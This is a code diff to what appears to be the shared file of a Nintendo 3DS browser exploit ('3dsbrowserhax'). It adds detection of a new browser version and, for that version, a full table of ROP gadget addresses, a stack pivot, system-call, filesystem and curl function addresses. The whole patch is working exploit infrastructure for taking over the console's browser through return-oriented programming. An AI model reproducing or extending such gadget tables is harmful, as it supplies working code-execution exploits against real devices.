@@ -33,7 +33,7 @@ if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0
 
 if(!isset($generatebinrop))$generatebinrop = 0;
 
-$browserver = -1;
+if(!isset($browserver))$browserver = -1;
 
 //old3ds: browserver titlever sysver
 if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2 (not actually supported)
@@ -76,6 +76,10 @@ else if(strstr($ua, "1.3.10126"))//1.3.10126 v3077 9.9.0-26
 {
 	$browserver = 0x83;
 }
+else if(strstr($ua, "1.4.10138"))//1.4.10138 v4096 10.2.0-28
+{
+	$browserver = 0x84;
+}
 
 if($browserver == -1)
 {
@@ -84,7 +88,7 @@ if($browserver == -1)
 	exit;
 }
 
-if(!($browserver>=1 && $browserver<=6) && !(($browserver & 0x80) && ($browserver>=0x80 && $browserver<=0x83)))
+if(!($browserver>=1 && $browserver<=6) && !(($browserver & 0x80) && ($browserver>=0x80 && $browserver<=0x84)))
 {
 	echo "This browser version is not supported.\n";
 	//error_log("3dsbrowserhax_common.php: BROWSERVER NOT SUPPORTED.");
@@ -899,6 +903,88 @@ else if($browserver == 0x83)
 	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;
 
 	$ROP_snprintf = $OSSCRO_MAPADR+0xde1a0-0x4;
+}
+else if($browserver == 0x84)
+{
+	$CODEBLK_ENDADR = ((0x00100000 + 0x00277000 + 0x00064000 + 0x0000A000 + 0x00045928) + 0xfff) & ~0xfff;
+	$OSSCRO_HEAPADR = 0x08133000;
+	$WEBKITCRO_HEAPADR = 0x083ff000;
+	$PEERCRO_HEAPADR = 0x0831a000;
+	$APPHEAP_PHYSADDR = 0x2b000000;
+	init_mapaddrs_cro();
+
+	$STACKPIVOT_ADR = 0x0027b12c;
+	$COND_THROWFATALERR = 0x00262760;
+
+	$ROP_POP_R0R6PC = 0x001df7f0;
+	$ROP_POP_R0R8PC = 0x0030c318;
+	$ROP_POP_R0PC = 0x00296e58;
+	$ROP_POP_R1R5PC = 0x001dcdd0;
+
+	$ROP_STR_R1TOR0 = 0x00226c04;
+	$ROP_LDR_R0FROMR0 = 0x001f7a04;
+	$ROP_ADDR0_TO_R1 = 0x0027b9dc;
+
+	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x002974fc;
+
+	$srv_GetServiceHandle = 0x001eaafc;
+
+	$svcGetProcessId = 0x0026bc20;
+	$svcSendSyncRequest = 0x001eb138;
+	$svcControlMemory = 0x002634d0;
+	$svcSleepThread = 0x002d8cc4;
+
+	$GXLOW_CMD4 = 0x002a248c;
+	$GSPGPU_SERVHANDLEADR = 0x003e33d0;
+
+	$FS_MOUNTSDMC = 0x00318d20;
+
+	$IFile_Open = 0x003222d4;
+	$IFile_GetSize = 0x001f1fdc;
+	$IFile_Seek = 0x0032d93c;
+	$IFile_Read = 0x0030c43c;
+
+	$FS_DELETEFILE = 0x00325b04;
+
+	$FSFILEIPC_CLOSE = 0x00267d7c;
+	$FSFILEIPC_READ = 0x00267d24;
+	$FSFILEIPC_GETSIZE = 0x00334928;
+
+	$POPPC = 0x001df60c;
+
+	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x00422440;
+
+	$WKC_FOPEN = $OSSCRO_MAPADR+0xde430-0x4;
+	$WKC_FCLOSE = $OSSCRO_MAPADR+0xde420-0x4;
+	$WKC_FREAD = $OSSCRO_MAPADR+0xde428-0x4;
+	$WKC_FWRITE = $OSSCRO_MAPADR+0xde438-0x4;
+	$WKC_FSEEK = $PEERCRO_MAPADR+0x1f83d;
+
+	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4dbb58-0x4;
+	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db6c0-0x4;
+	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dbc20-0x4;
+	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db6c8-0x4;
+
+	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4daf68-0x4;
+	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4daf48-0x4;
+
+	$ROP_snprintf = $OSSCRO_MAPADR+0xde228-0x4;
+
+	$GSP_FLUSHDCACHE = 0x0029dad0;
+	$GSP_WRITEHWREGS = 0x002982f8;
+
+	$IFile_Close = 0x001ec780;
+	$IFile_Write = 0x00327248;
+
+	$THROW_FATALERR = 0x001f1fac;
+
+	$ROP_LDMSTM_R5R4_R0R3 = 0x001e8b28;
+
+	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2ea0;
+
+	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x00102834;
+
+	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;
 }
 
 if($browserver == 3 || $browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
